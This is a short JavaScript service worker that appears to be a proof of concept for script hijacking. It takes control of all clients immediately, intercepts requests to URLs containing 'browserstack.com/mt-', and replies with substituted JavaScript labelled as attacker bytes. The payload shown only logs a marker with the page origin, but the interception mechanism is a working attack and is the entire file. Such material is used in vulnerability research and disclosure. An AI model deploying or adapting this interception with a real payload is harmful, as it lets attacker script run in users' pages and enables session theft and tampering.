const JS = "/*SWSPLIT_ATTACKER_JS_BYTES*/\ntry{(function(){var m='SWSPLIT_EXEC@'+location.origin;console.log(m);})()}catch(e){}\n";
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  const u = e.request.url;
  if (u.indexOf('browserstack.com/mt-') < 0) return;
  e.respondWith(new Response(JS, { headers: { 'Content-Type': 'text/javascript' } }));
});
